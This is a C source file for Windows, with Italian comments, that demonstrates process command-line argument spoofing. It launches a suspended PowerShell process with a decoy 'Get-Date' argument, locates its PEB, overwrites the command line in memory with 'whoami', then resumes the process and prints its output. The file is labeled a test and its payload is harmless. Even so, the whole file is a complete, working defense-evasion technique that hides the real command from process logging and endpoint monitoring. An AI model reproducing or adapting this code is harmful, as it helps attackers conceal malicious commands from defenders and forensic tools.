#include <windows.h>
#include <stdio.h>
#include <stddef.h>

/*
    ============================================================
    STRUTTURE NT NECESSARIE PER ACCEDERE AL PEB DEL PROCESSO
    ============================================================
*/

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
} PEB, *PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(
    HANDLE,
    DWORD,
    PVOID,
    ULONG,
    PULONG
);


int main() {

    printf("=================================================\n");
    printf(" Test Argument Spoofing\n");
    printf(" Falso: Get-Date  |  Reale: whoami\n");
    printf("=================================================\n\n");


/*
    ============================================================
    STEP 1 — CARICA NtQueryInformationProcess
    ============================================================
*/

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(
            hNtdll,
            "NtQueryInformationProcess"
        );

    if (!NtQueryInformationProcess) {
        printf("Errore caricamento NtQueryInformationProcess\n");
        return 1;
    }


/*
    ============================================================
    STEP 2 — CREA PIPE PER CATTURARE OUTPUT
    ============================================================
*/

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;

    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        printf("CreatePipe failed\n");
        return 1;
    }

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);


/*
    ============================================================
    STEP 3 — CREA PROCESSO SOSPESO CON ARGOMENTO FALSO
    ============================================================
*/

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    si.cb = sizeof(si);

    /*
        IMPORTANTISSIMO

        STARTF_USESTDHANDLES permette di reindirizzare
        stdout e stderr verso la pipe
    */

    si.dwFlags = STARTF_USESTDHANDLES;

    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);


    char fakeCmdLine[] =
        "powershell.exe -NoProfile -Command Get-Date";

    printf("[*] CreateProcess con command line FALSA:\n");
    printf("    %s\n\n", fakeCmdLine);


    BOOL result = CreateProcessA(
        NULL,
        fakeCmdLine,
        NULL,
        NULL,
        TRUE,                       // eredita la pipe
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!result) {
        printf("CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[OK] Processo creato (sospeso) PID %lu\n\n", pi.dwProcessId);


/*
    ============================================================
    STEP 4 — OTTIENI L'INDIRIZZO DEL PEB
    ============================================================
*/

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG retLen = 0;

    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        0,
        &pbi,
        sizeof(pbi),
        &retLen
    );

    if (status != 0) {
        printf("NtQueryInformationProcess error\n");
        return 1;
    }

    printf("[OK] PEB address: %p\n", pbi.PebBaseAddress);


/*
    ============================================================
    STEP 5 — LEGGI ProcessParameters
    ============================================================
*/

    PVOID pProcessParameters = NULL;
    SIZE_T bytesRead = 0;

    ReadProcessMemory(
        pi.hProcess,
        (BYTE*)pbi.PebBaseAddress + offsetof(PEB, ProcessParameters),
        &pProcessParameters,
        sizeof(PVOID),
        &bytesRead
    );


/*
    ============================================================
    STEP 6 — LEGGI UNICODE_STRING DELLA COMMANDLINE
    ============================================================
*/

    UNICODE_STRING cmd = {0};

    ReadProcessMemory(
        pi.hProcess,
        (BYTE*)pProcessParameters +
        offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine),
        &cmd,
        sizeof(cmd),
        &bytesRead
    );

    printf("[OK] CommandLine buffer: %p\n", cmd.Buffer);


/*
    ============================================================
    STEP 7 — SCRIVI COMMANDLINE REALE
    ============================================================
*/

    wchar_t realCmd[] =
        L"powershell.exe -NoProfile -Command whoami";

    SIZE_T size = (wcslen(realCmd) + 1) * sizeof(wchar_t);

    if (size > cmd.MaximumLength) {
        printf("Buffer troppo piccolo\n");
        return 1;
    }

    WriteProcessMemory(
        pi.hProcess,
        cmd.Buffer,
        realCmd,
        size,
        &bytesRead
    );


/*
    ============================================================
    STEP 8 — AGGIORNA LUNGHEZZA STRINGA
    ============================================================
*/

    USHORT newLen = (USHORT)(wcslen(realCmd) * sizeof(wchar_t));

    WriteProcessMemory(
        pi.hProcess,
        (BYTE*)pProcessParameters +
        offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine) +
        offsetof(UNICODE_STRING, Length),
        &newLen,
        sizeof(newLen),
        &bytesRead
    );

    printf("[OK] CommandLine spoofata nel PEB\n\n");


/*
    ============================================================
    STEP 9 — RESUME DEL PROCESSO
    ============================================================
*/

    ResumeThread(pi.hThread);

    CloseHandle(hWritePipe);


/*
    ============================================================
    STEP 10 — LEGGI OUTPUT REALE DEL PROCESSO
    ============================================================
*/

    printf("Output reale (whoami):\n");
    printf("----------------------\n");

    char buffer[4096];
    DWORD read;

    while (ReadFile(
        hReadPipe,
        buffer,
        sizeof(buffer)-1,
        &read,
        NULL) && read > 0)
    {
        buffer[read] = 0;
        printf("%s", buffer);
    }

    printf("\n----------------------\n");


/*
    ============================================================
    STEP 11 — CLEANUP
    ============================================================
*/

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("\nTest completato.\n");

    getchar();
    return 0;
}